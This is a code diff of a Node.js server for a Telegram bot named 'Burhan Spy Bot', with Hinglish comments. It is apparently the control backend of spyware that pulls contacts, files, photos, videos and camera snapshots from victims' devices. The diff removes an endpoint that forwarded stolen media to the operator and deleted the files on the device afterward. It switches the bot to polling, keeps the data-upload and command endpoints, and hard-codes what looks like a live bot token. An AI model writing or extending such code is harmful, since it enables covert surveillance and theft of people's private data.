@@ -6,11 +6,11 @@ const axios = require('axios');
 
 const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
 const YOUR_USER_ID = 2062068620;
-const bot = new TelegramBot(token); // ⚠️ POLLING HATA DIYA
+const bot = new TelegramBot(token, { polling: true });
 const app = express();
 app.use(express.json());
 
-// 📁 DATA STORE KARNE KE LIYE FILE
+// 📁 DATA STORE KARNE KE LIYE FILE (SAHI PATH)
 const dataFile = path.join(__dirname, 'devices.json');
 let devices = {};
 if (fs.existsSync(dataFile)) {
@@ -55,43 +55,10 @@ app.post('/api/upload-data', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ App se Bada Data (Photo, Video, Snapshot) receive karo
-app.post('/api/stream-data', (req, res) => {
-    const { deviceId, type, filePath } = req.body;
-    
-    if (type === 'photo') {
-        bot.sendPhoto(YOUR_USER_ID, filePath);
-    } else if (type === 'video') {
-        bot.sendVideo(YOUR_USER_ID, filePath);
-    } else if (type === 'snapshot') {
-        bot.sendPhoto(YOUR_USER_ID, filePath);
-    }
-    
-    // ✅ FILE DELETE KARO (Auto-Delete)
-    try {
-        if (fs.existsSync(filePath)) {
-            fs.unlinkSync(filePath);
-        }
-    } catch (e) {
-        // ignore
-    }
-    
-    res.json({ success: true });
-});
-
 // ✅ App ko commands bhejo (GET /api/commands?deviceId=...)
 app.get('/api/commands', (req, res) => {
     const { deviceId } = req.query;
     res.json({ command: 'status' });
-});
-
-// ✅ TELEGRAM WEBHOOK SETUP (MOST IMPORTANT)
-bot.setWebHook(`${process.env.RAILWAY_PUBLIC_DOMAIN}/webhook`);
-
-// ✅ WEBHOOK RECEIVER (Telegram messages yahan aayenge)
-app.post('/webhook', (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
 });
 
 // ✅ START COMMAND
@@ -104,7 +71,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/files - Scan Files\n/getphoto - Get Photo\n/getvideo - Get Video\n/camera - Camera Snapshot\n/ping - Check device alive\n/stats - Total devices\n/contacts - Fetch contacts\n/help - Commands ka format`);
 });
 
-// ✅ /devices
+// ✅ DEVICES COMMAND
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
